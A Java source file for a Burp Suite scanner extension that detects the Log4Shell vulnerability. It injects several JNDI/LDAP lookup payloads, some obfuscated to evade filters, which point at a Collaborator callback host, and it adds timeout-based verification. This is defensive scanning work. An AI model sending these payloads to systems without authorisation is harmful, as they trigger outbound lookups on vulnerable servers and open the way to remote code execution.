package com.daimler_tss.log4shell.scan;

import burp.*;
import com.daimler_tss.log4shell.EarlyHttpRequestResponse;
import org.slf4j.Logger;

import java.net.MalformedURLException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;

public class Log4ShellScan implements IScannerCheck
{
    private static HashMap<String, ArrayList<IScanIssue>> asyncIssues = new HashMap<>();
    private final Logger logger;
    private IBurpExtenderCallbacks callbacks;
    private ArrayList<String> reportedHosts = new ArrayList<>();

    public Log4ShellScan(IBurpExtenderCallbacks callbacks, Logger logger)
    {
        this.callbacks = callbacks;
        this.logger = logger;
    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse iHttpRequestResponse)
    {
        String host = iHttpRequestResponse.getHttpService().getProtocol()+"://"+iHttpRequestResponse.getHttpService().getHost()+":"+iHttpRequestResponse.getHttpService().getPort();

        return asyncIssues.get(host);
    }

    @Override
    public List<IScanIssue> doActiveScan(
        IHttpRequestResponse iHttpRequestResponse, IScannerInsertionPoint iScannerInsertionPoint)
    {
        try {
            String host = iHttpRequestResponse.getHttpService().getProtocol()+"://"+iHttpRequestResponse.getHttpService().getHost()+":"+iHttpRequestResponse.getHttpService().getPort();
            if (reportedHosts.contains(host)) {
                return asyncIssues.get(host);
            }
            IBurpCollaboratorClientContext collab = this.callbacks.createBurpCollaboratorClientContext();
            String collabString = collab.generatePayload(true);
            ArrayList<String> payloads = new ArrayList<>();
            payloads.add("${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}."+collabString+"/a}");
            payloads.add("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1#${hostName}."+collabString+"/a}");
            payloads.add("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}."+collabString+"/a}");
            payloads.add("${jndi:ldap://${hostName}." + collabString + ":80/a}");
            payloads.add("${jndi:ldap://" + collabString + ":80/a}");


            logger.info("Scanning " + iHttpRequestResponse.getHttpService().getHost());
            String name = iScannerInsertionPoint.getInsertionPointName() + iScannerInsertionPoint.getInsertionPointName() + ": " + iScannerInsertionPoint.getBaseValue();
            logger.info("Scanning " + name);
            ArrayList<IScanIssue> issues = new ArrayList<>();

            for (String payload : payloads) {
                URL url = callbacks.getHelpers().analyzeRequest(iHttpRequestResponse).getUrl();
                byte[] payloadBytes = payload.getBytes(StandardCharsets.UTF_8);
                byte[] request = iScannerInsertionPoint.buildRequest(payloadBytes);
                int[] offsets = iScannerInsertionPoint.getPayloadOffsets(payloadBytes);
                EarlyHttpRequestResponse earlyHttpRequestResponse = new EarlyHttpRequestResponse(iHttpRequestResponse.getHttpService(), request);

                IHttpRequestResponse response = callbacks.makeHttpRequest(
                    iHttpRequestResponse.getHttpService(),
                    request
                );
                ArrayList<IHttpRequestResponse> messages = new ArrayList<>();
                if (response.getResponse().length == 0) {
                    messages.add(callbacks.applyMarkers(earlyHttpRequestResponse, Collections.singletonList(offsets), null));
                } else {
                    messages.add(callbacks.applyMarkers(response, Collections.singletonList(offsets), null));
                }


                List<IBurpCollaboratorInteraction> interactions = collab.fetchAllCollaboratorInteractions();
                if (interactions.size() > 0) {
                    Log4ShellIssue issue = handleInteraction(
                        iHttpRequestResponse,
                        name,
                        url,
                        response,
                        messages,
                        interactions
                    );
                    reportedHosts.add(host);
                    issues.add(issue);

                    break;
                } else  if (response.getResponse().length == 0) {
                    // timeout handling
                    byte[] verifyPayloadBytes = payload.replace("${::-p}", "${::-b}").replace("ldap", "ldab").getBytes(StandardCharsets.UTF_8);
                    byte[] verifyRequest = iScannerInsertionPoint.buildRequest(verifyPayloadBytes);
                    int[] verifyOffsets = iScannerInsertionPoint.getPayloadOffsets(verifyPayloadBytes);
                    IHttpRequestResponse verifyResponse = callbacks.makeHttpRequest(
                        iHttpRequestResponse.getHttpService(),
                        verifyRequest
                    );
                    if (verifyResponse.getResponse().length > 0) {

                        // check for false positive
                        IHttpRequestResponse responseRecheck = callbacks.makeHttpRequest(
                            iHttpRequestResponse.getHttpService(),
                            request
                        );
                        if (responseRecheck.getResponse().length == 0) {
                            logger.info("Timeout detected for on " + url + " for " + name);

                            messages.add(callbacks.applyMarkers(verifyResponse, Collections.singletonList(verifyOffsets), null));
                            Log4ShellTimeoutIssue issue = new Log4ShellTimeoutIssue(
                                new URL(url.getProtocol(), url.getHost(), url.getPort(), url.getPath() + "__burp__"),
                                iHttpRequestResponse.getHttpService(),
                                messages.toArray(new IHttpRequestResponse[0])
                            );
                            reportedHosts.add(host);
                            issues.add(issue);

                            break;
                        }
                    }
                }
            }
            for (IScanIssue issue : issues) {
                callbacks.addScanIssue(issue);
                if (!asyncIssues.containsKey(host)) {
                    asyncIssues.put(host, new ArrayList<>());
                }
                asyncIssues.get(host).add(issue);
            }

            return issues;

        } catch (Exception e) {
            logger.error("Error while scanning", e);
        }
        return null;

    }

    private Log4ShellIssue handleInteraction(
        IHttpRequestResponse iHttpRequestResponse,
        String name,
        URL url,
        IHttpRequestResponse response,
        ArrayList<IHttpRequestResponse> messages,
        List<IBurpCollaboratorInteraction> interactions) throws MalformedURLException
    {
        logger.info("Found " + interactions.size() + " interactions on " + url + " in " + name);

        return new Log4ShellIssue(
            response.getResponse().length == 0 ? new URL(url.getProtocol(), url.getHost(), url.getPort(), url.getPath() + "__burp__") : url,
            iHttpRequestResponse.getHttpService(),
            messages.toArray(new IHttpRequestResponse[0]),
            interactions
        );
    }

    private IHttpRequestResponse request(
        IHttpRequestResponse iHttpRequestResponse,
        IScannerInsertionPoint iScannerInsertionPoint,
        String payload)
    {
        byte[] request = iScannerInsertionPoint.buildRequest(payload.getBytes(StandardCharsets.UTF_8));

        return callbacks.makeHttpRequest(iHttpRequestResponse.getHttpService(), request);
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue iScanIssue, IScanIssue iScanIssue1)
    {
        return 0;
    }
}
